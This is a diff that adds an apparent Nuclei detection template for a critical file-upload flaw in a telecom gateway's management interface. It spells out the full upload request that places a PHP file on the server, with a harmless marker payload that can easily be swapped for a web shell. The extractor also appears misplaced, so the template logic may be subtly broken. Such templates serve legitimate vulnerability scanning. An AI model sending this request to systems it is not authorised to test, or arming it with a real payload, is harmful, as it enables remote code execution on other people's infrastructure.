@@ -1,0 +1,76 @@
+id: telecom-gateway-fileupload-vuln
+info:
+  name: Telecom Gateway File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    There is a file upload vulnerability in the telecom gateway configuration management system. An attacker can exploit this to upload malicious files and potentially gain shell access to the system.
+  tags: fileupload,rce
+  reference:
+    - https://cn-sec.com/archives/1786350.html
+
+http:
+  - raw:
+      - |
+        POST /manager/teletext/material/upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
+        Cookie: PHPSESSID=vsdl33qjn3fbslu7k3r99di5n3
+        Upgrade-Insecure-Requests: 1
+
+        ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+        Content-Disposition: form-data; name="fileToUpload"; filename="{{rand_base(4)}}.php"
+        Content-Type: application/x-php
+
+        <?php print(md5(233));unlink(__FILE__);
+        ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+        Content-Disposition: form-data; name="type"
+
+        img
+        ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+        Content-Disposition: form-data; name="w"
+
+        1280
+        ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+        Content-Disposition: form-data; name="h"
+
+        720
+        ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+        Content-Disposition: form-data; name="userid"
+
+        10003xx
+        ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+        Content-Disposition: form-data; name="appid"
+
+        5
+        ------WebKitFormBoundaryssh7UfnPpGU7BXfK--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ret_msg:success
+          - material
+
+  - raw:
+      - |
+        GET /{{material_url}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: material_url
+        internal: true
+        part: body
+        regex:
+          - '"ret":0,"ret_msg":"success","url":"(.*?)"'
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - e165421110ba03099a1c0393373c5
